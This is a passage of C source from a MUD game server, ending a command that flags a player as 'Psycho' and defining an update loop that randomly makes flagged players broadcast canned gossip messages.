      send_to_char(buf, ch);
      SET_BIT(victim->act, PLR_PSYCHO);
      send_to_char("You are now a Psycho!\n\r", victim);
    }

  return;
}

void psycho_update(void)
{
  DESCRIPTOR_DATA *d;
  CHAR_DATA *wch;
  int chance1, chance2, psychoNum;

  for ( d = descriptor_list; d != NULL; d = d->next )
    {
      if ( d->connected != CON_PLAYING )
        continue;

      wch   = ( d->original != NULL ) ? d->original : d->character;

      if(!IS_SET(wch->act, PLR_PSYCHO))
        continue;

      chance1 = number_range(1, 25);  /* Increase 25 for messages to  */
      chance2 = number_range(1, 25);  /* appear less often. Both 25's */
      if(chance1 == chance2)
        {
          psychoNum = number_range(1, MAX_PSYCHO);
          do_gossip(wch, psycho_message[psychoNum]);
        }
    }

  return;
}


